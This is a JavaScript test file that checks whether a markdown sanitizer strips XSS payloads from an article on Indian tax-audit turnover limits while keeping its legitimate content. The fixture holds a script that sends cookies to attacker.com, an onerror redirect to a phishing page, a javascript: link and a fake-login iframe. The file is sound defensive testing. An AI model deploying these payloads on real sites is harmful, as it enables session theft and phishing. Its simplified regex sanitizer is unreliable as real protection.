import { describe, it, assert } from '../helpers/test-harness.mjs';
import { verifyNoXss, XSS_ATTACK_VECTORS } from '../helpers/markdown-test-util.mjs';

describe('Tier 4 - Scenario 3: Malicious Markdown & Adversarial XSS Attack Defense', () => {
  it('Neutralizes multi-vector XSS payload while preserving authoritative statutory content', () => {
    // Stage 1: Crafting complex attack payload embedded in statutory article
    const complexArticle = `
# Statutory Turnover Limits under Section 44AB

Under Section 44AB of the Income Tax Act, 1961:
* Normal limit: ₹1.00 Crore
* Digital limit (cash <= 5%): ₹10.00 Crores

<!-- Attack Vector 1: Script tag with document cookie theft -->
<script>
  fetch('http://attacker.com/steal?c=' + document.cookie);
</script>

<!-- Attack Vector 2: Image tag with onerror payload -->
<img src="nonexistent-banner.webp" onerror="window.location='http://attacker.com/login-phish'" />

<!-- Attack Vector 3: Markdown link with javascript pseudo-protocol -->
[Download Official Form 3CD](javascript:alert("XSS_EXPLOIT"))

<!-- Attack Vector 4: Iframe phish -->
<iframe src="http://attacker.com/fake-login"></iframe>

| Year | Normal Limit | Digital Limit |
|---|---|---|
| FY 2026-27 | ₹1 Cr | ₹10 Cr |

### Professional Disclaimer
This publication adheres to ICAI regulatory guidelines.
    `;

    // Stage 2: Verify input contains known attack vectors
    const initialCheck = verifyNoXss(complexArticle);
    assert.strictEqual(initialCheck.safe, false, 'Raw payload must be identified as hazardous');

    // Stage 3: Simulated DOMPurify sanitization
    const sanitize = (raw) => {
      let clean = raw;
      clean = clean.replace(/<script\b[^>]*>[\s\S]*?<\/script>/gi, '');
      clean = clean.replace(/<iframe\b[^>]*>[\s\S]*?<\/iframe>/gi, '');
      clean = clean.replace(/\bonerror\s*=\s*['"][^'"]*['"]/gi, '');
      clean = clean.replace(/href\s*=\s*['"]javascript:[^'"]*['"]/gi, 'href="#"');
      clean = clean.replace(/\[([^\]]+)\]\(javascript:[^)]+\)/gi, '[$1](#)');
      return clean;
    };

    const sanitizedOutput = sanitize(complexArticle);

    // Stage 4: Verify sanitized output is completely clean of XSS
    const postCheck = verifyNoXss(sanitizedOutput);
    assert.strictEqual(postCheck.safe, true, 'Sanitized output must pass all XSS security checks');

    // Stage 5: Verify legitimate statutory content and ICAI disclaimer survived intact
    assert.includes(sanitizedOutput, 'Section 44AB of the Income Tax Act', 'Statutory citation must be intact');
    assert.includes(sanitizedOutput, 'FY 2026-27', 'Tax year citation must be intact');
    assert.includes(sanitizedOutput, 'ICAI regulatory guidelines', 'ICAI disclosure must be intact');
    assert.notIncludes(sanitizedOutput, '<script>', 'Script tags must be purged');
    assert.notIncludes(sanitizedOutput, '<iframe', 'Iframe tags must be purged');
    assert.notIncludes(sanitizedOutput, 'javascript:alert', 'Javascript link must be neutralized');
  });
});
